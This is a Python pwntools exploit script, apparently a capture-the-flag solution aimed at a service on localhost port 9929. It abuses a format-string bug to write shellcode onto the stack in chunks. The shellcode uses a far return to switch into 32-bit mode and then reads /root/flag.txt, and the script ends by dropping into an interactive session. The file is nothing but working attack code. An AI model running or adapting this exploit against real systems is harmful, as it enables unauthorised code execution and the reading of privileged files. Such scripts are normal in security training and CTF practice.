#!/usr/bin/env python3

from pwn import *

class ProbIO:
    def __init__(self, r):
        self.r = r
        self.sla = lambda t, x: self.r.sendlineafter(t, x)
        self.sl = lambda x: self.r.sendline(x)

    def enter(self, content, read=False):
        self.sla("Enter: ", content)
        if read:
            self.r.recvuntil("Entered: ")
            print(self.r.recvline())

    def enterEx(self, content):
        self.sl(content)
        
class Primitives:
    def __init__(self, io):
        self.io = io

    def enterOnly(self, content): return self.io.enter(content, False)
    def enterRead(self, content): return self.io.enter(content, True)
    def genSc(self, *args, **kwargs):
        self.base = args[0] & 0xffff0000
        
        context.arch = 'i386'
        context.bits = 32
        self.cat = shellcraft.i386.linux.cat("/root/flag.txt")
        context.arch = 'amd64'
        context.bits = 64

        self.switch = asm("""
        call $+5
        pop rax
        add rax, 0x14
        mov rsi, 0x2300000000
        xor rax, rsi
        push rax
        retfd
        """, vma=self.base)

        self.code32 = asm(f"""
        mov esp, {hex(self.base + 0x0f00)}
        """ + self.cat, vma=self.base + len(self.switch), arch='i386', bits=32)

        self.sc = self.switch + self.code32
        return self.sc

def exploit(pri):
    #pause()
    offset = 8
    stack = 0x50510000

    sc = pri.genSc(stack)

    for i in range(0, len(sc), 4):
        payload = fmtstr_payload(8, {stack+(0x10 + i):sc[i:i + 4]})
        pri.enterOnly(payload)

    #pause()

    pri.enterOnly("done")
    pri.io.r.interactive()

def main(r):
    io = ProbIO(r)
    pri = Primitives(io)
    exploit(pri)

if __name__ == "__main__":
    r = remote("localhost", 9929)
    main(r)
